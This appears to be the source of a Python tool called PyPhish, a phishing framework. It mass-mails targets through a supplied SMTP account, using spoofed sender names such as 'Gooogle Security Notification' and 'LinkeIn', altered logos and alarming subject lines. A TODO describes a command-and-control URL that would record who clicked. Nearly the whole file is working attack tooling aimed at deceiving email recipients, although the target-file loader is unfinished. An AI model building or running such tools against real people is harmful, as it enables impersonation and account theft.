import csv
import datetime
import smtplib
import getpass
import os.path
import re
import random
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr
from datetime import datetime, timedelta
from argparse import *
        
#TODO: C2 URL should contain the target email address(ex: http://C2C.com?source=thebytemachine.com), to let C2 know who clicked.

templates = {'google':'', 'linkedin':''}
placeholders = ['EMAIL_PLACEHOLDER', 'C2_URL_PLACEHOLDER', 'RECEIVER_NAME_PLACEHOLDER']
spoofed_sources = {'google' : 'Gooogle Security Notification', 'linkedin' : 'LinkeIn'}
email_subjects = {'google' : 'Security notice regarding the account EMAIL_PLACEHOLDER', 'linkedin' : '100 people noticed you'}
modified_logos = {'google' : 'https://i.ibb.co/8jdrz6F/gooogle.png', 'linkedin' : 'https://i.ibb.co/9GRmdpc/linkedin.png'}
tool_logo = """ \
                     @                                       
                    @                                       
                  :@MM;                                     
                  MMiMMi                                    
                  MM8MM                                     
                   SMZ                                      
                   rMX                                      
                   XMX    ,M                                
                   SMX   ;MM                                
                   rMi  SMM,  WMM;                          
                 i7@M8;ZMMM2WMMMMMMa22222a2a27              
                 MMWMMM@WBB@MWWBBBMMMMMMMMM@MM              
                 MM  @M  X;r;rr7;r;rrrrr;Xi MM              
                 MM ,   rZa2X.  .,XSZ2SXS2; MM              
                 MM Xa;i;r  7ZZ8Bar, ,a2SZi MM              
                 MM 7aZZ  ,MM22aSXMMr SX2a; MM              
               ZMMM raSZ 7M2 SM0@Z iMW  S8; MMM@.           
             ZMM7@M 72Xr MZ .M; .M7 :Mi 2Zr MMrMMW:         
            MMM  BM raa: M,  MMBMM   M2 aZ; MM  MMM;        
            MMMMaMM XSXX MM ZM8B8MM XM. Z8i MMXMMMM;        
            MM ;MMM .XSZ  MMMi,SX MMMX ,Sa  MMMZ aM;        
            MM   XMMX ;aa, 2MMB8WMMB  ZZ  iMMZ   8M;        
            MM     ZMMX iZSi  :0r   7r  :MMM   . 0M;        
            MM  :.   BMM7.,i .MMM7  ;  WMM:  .:. 0M;        
            MM .,:,,   MMW  MMW SMMr ZMMi  ,,:,, 0M;        
            MM  ,,:,,.   MMMM     0MMMi  .,,,,,. 0M;        
            MM .,:,,,   8MM:   ,.   0MM,  .:,::, BM;        
            MM .:,,   BMM;   ,:,:,,  .MMM.  .,:, 0M;        
            MM ..   aMMS   :::,,,:,:.  iMM@   ., 0M;        
            MM    SMMa   ,:,:,:,,,:,:,.  rMM0    8Mi        
            MM  ;MM0   ..,.:,,,,,,,:,,.,   XMMa  8M;        
            MM @MZ                           rMM:ZM;        
            MMMMZi;XSSSSXSXSXSXSSSSSSSSSSSSS7iXMMMM7        
            @MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM,                                                                                                                                
"""

def load_templates():
    for template in templates.keys():
        with open(f'templates/{template}.html', 'r') as file:
            templates[template] = file.read()

def create_placeholders_map(email, name=None, c2_url=None):
    placeholdersmap = {}
    placeholdersmap['EMAIL_PLACEHOLDER'] = email
    if name is not None:
        placeholdersmap['RECEIVER_NAME_PLACEHOLDER'] = name
    else:
        placeholdersmap['RECEIVER_NAME_PLACEHOLDER'] = email #when name is not available, use the email
    if c2_url is not None:
        placeholdersmap['C2_URL_PLACEHOLDER'] = c2_url
    return placeholdersmap

def replace_placeholders(subject, html, placeholdersmap):
    rsubject = subject
    rhtml = html
    for pholder in placeholdersmap.keys():
        rsubject = rsubject.replace(pholder, placeholdersmap[pholder])
        rhtml = rhtml.replace(pholder, placeholdersmap[pholder])
    return (rsubject, rhtml)

def send_emails(sender_email, targets, smtp_server, smtp_port, sender_psw):
    """ Sends the emails to the proper receivers """
    for (email, name, template) in targets:
        target_email = email          
        placeholdersmap = create_placeholders_map(target_email, name)
        subject = email_subjects[template]
        html = templates[template]        
        subject, html = replace_placeholders(subject, html, placeholdersmap)        
        message = MIMEMultipart("alternative")
        message["Subject"] = subject
        message["From"] = formataddr((spoofed_sources[template], sender_email)) 
        message["To"] = target_email
        # Create the plain-text version of the message too. We could simply insert the C2 url ?
        text = """\
            Plain text. If you are seeing this message, it means that HTML emails are not supported.
        """        
        part1 = MIMEText(text, "plain")
        part2 = MIMEText(html, "html")
        message.attach(part1)
        message.attach(part2)        
        with smtplib.SMTP(smtp_server, smtp_port) as server:
            server.ehlo()
            server.starttls()
            server.login(sender_email, sender_psw)
            try:
                server.sendmail(sender_email, target_email, message.as_string())
            finally:
                server.quit()

def get_smtp_server(pargs):
    smtp = pargs.SMTP_SERVER
    if ':' in smtp:
        return (smtp.split(':')[0], smtp.split(':')[1])
    else:
        return (smtp, '587') #no port specified: return default port

def get_targets_data(pargs):
    '''
    Returns a list of tuples about the targets. Each tuple refers to a target and is made of three components:
    (target_email, target_name, target_pretext), where:
    target_email is the email address of the target
    target_name is the name of the target. Can be empty if not specified.
    target_template is the email template used as pretext for the phishing attack against the target
    A distinction is made based on whether user provided the path to a configuration file or a list of target emails.
    '''
    def is_path_to_file(fname):
        return os.path.isfile(fname)
        
    def get_targets_data_from_file():
        #TODO
        print(get_targets_data_from_file)
        
    def get_valid_emails():
        emails = targets.split(',')
        regex = re.compile(r'([A-Za-z0-9]+[.-_])*[A-Za-z0-9]+@[A-Za-z0-9-]+(\.[A-Z|a-z]{2,})+')
        return [email for email in emails if re.fullmatch(regex, email)]
        
    def get_random_template():
        return random.choice(list(templates.keys()))
    targets = pargs.TARGETS
    if is_path_to_file(targets):
        return get_targets_data_from_file()
    else:
        emails = get_valid_emails()
        template = args.template if args.template else get_random_template()
        return [(email, None, template) for email in emails]    
  
def get_sender_psw(pargs):
    if pargs.password is not None:
        return pargs.password
    else:
        return getpass.getpass(prompt='\nSMTP Server Password: ')
 
def print_targets_data(targets):
    print('\nPhishing Targets:')
    [print(f'- Email: {email}, Name: {name}, Template: {template}') for (email,name,template) in targets]
 
if __name__ == '__main__':    
    parser = ArgumentParser(description=print(tool_logo), epilog="PyPhish: the Python Phishing Framework \nAuthor: Francesco Balzano \nLicense: MIT")
    parser.add_argument('SENDER_EMAIL',  help="The sender email address (e.g.: user@example.com)")
    parser.add_argument('SMTP_SERVER',  help="The SMTP fully qualified name together with the port, in the following format:" + 
    "<FQDN:PORT> (ex: smtp.example.com:587). If a port is not provided, it will default to 587.")
    parser.add_argument("TARGETS", help=
        "A comma separated receivers email addresses (e.g.: user1@example.com,user2@example.com,user3@example.com) or the PATH of a configuration file." +
        " A configuration file is a CSV file holding information about the phishing targets. It is made of three columns:" +
        "'Email', 'Name' and 'Template'. The email is necessary, while the 'Name' and 'Template' fields are optional. In case a name " + 
        "is associated with  an email, it will allow to build more user-tailored phishing emails. 'Template' allow to specify " + 
        "specific phishing emails for each target. Allowed values are the following: <google|linkedin>.")           
    
    parser.add_argument('-P', "--password", help="The password needed to connect the sender to the SMTP server. If not provided," + 
    "user will be prompted to insert it interactively.")
    parser.add_argument("-t", "--template", help="Specifies which phishing emails will be used for all the targets. Allowed values " + 
    "are the following: <google|linkedin>. If you want so specify distinct phishing emails for distinct targets, the receivers " + 
    "configuration file has to be used. If not specified, a random email template is chosen.") 
    parser.add_argument('-v', '--verbose', action='store_true', 
        help="Displays verbose message, such as the list of targets together with the chosen templates.")
    args = parser.parse_args()    
    sender = args.SENDER_EMAIL
    smtp_server, smtp_port = get_smtp_server(args)
    targets = get_targets_data(args)    
    sender_psw = get_sender_psw(args)    
    if args.verbose:
        print_targets_data(targets)
    print('\nSending emails ... \n')
    load_templates()
    send_emails(sender, targets, smtp_server, smtp_port, sender_psw)
    
